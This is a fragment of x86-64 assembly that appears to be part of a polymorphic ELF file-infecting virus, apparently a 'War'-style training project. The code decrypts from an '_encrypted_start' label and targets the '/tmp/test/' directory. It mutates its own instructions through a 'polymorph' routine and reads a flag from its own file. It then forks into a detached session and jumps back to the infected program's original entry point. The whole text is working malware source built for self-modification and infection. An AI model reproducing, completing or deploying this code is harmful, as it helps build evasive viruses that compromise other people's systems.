_encrypted_start:

    PUSH_ALL

	mov		rdi, [rbp + 16]
	add		rdi, mydata.path

	mov		rcx, 512
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	rep		stosq

	mov		rax, [rbp + 16]
	add		rax, mydata.path
	;lea		rax, [rel path]

	mov		[rax], byte '/'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte 'm'
	inc		rax
	mov		[rax], byte 'p'
	inc		rax
	mov		[rax], byte '/'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte 'e'
	inc		rax
	mov		[rax], byte 's'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte '/'
	inc		rax

	mov		rax, [rbp + 8]
	;lea		rax, [rel _start]

	mov		rdi, [rbp + 16]
	;lea		rdi, [rel _stop]


	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rdi
	mov		r8, 7
	mov		r9, 4
	call	polymorph
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rax
	call	polymorph
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rsi
	call	polymorph
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rdx
	call	polymorph
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rcx
	call	polymorph
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r10
	call	polymorph
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r11
	call	polymorph
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r13
	call	polymorph
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r15
	call	polymorph


	mov		rax, SYS_open
	mov		rdi, [rbp + 16]
	add		rdi, mydata.self
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall
	cmp		rax, 0

	jle		.just_quit
	mov		r12, rax
	mov		rax, SYS_pread64
	mov		rdi, r12
	mov		rsi, [rbp + 16]
	add		rsi, mydata.zero
	mov		rdx, 1
	mov		r10, 10
	syscall

	.just_quit:
	mov		rax, SYS_close
	mov		rdi, r12
	syscall

	POP_ALL

	mov		rax, [rbp + 16]
	add		rax, mydata.zero
	mov		al, BYTE [rax]	; SI ICI = 0, ca signfiie c'est war
	test	al, al
	jz		.continue

	mov		rax, SYS_fork
	syscall
	cmp		eax, 0
	jng		.continue_fork


	mov		rax, [rbp + 16]
	add		rax, mydata.entry
	mov		rax, [rax]

	mov		rdi, [rbp + 16]
	add		rdi, mydata.new_entry
	mov		[rdi], rax

	mov		rax, [rbp + 16]
	add		rax, mydata.new_entry
	mov		rax, [rax]

	mov		rdi, [rbp + 16]
	add		rdi, mydata.old_entry
	sub		rax, [rdi]

	mov		rdi, [rbp + 8]
	;lea		rdi, [rel _start]


	sub		rdi, rax
	mov		rax, [rbp + 16]
	add		rax, mydata.new_entry
	mov		[rax], rdi

	add		rsp, 64
	jmp		[rax]

.continue_fork:
	mov		rax, SYS_setsid
	syscall
.continue:
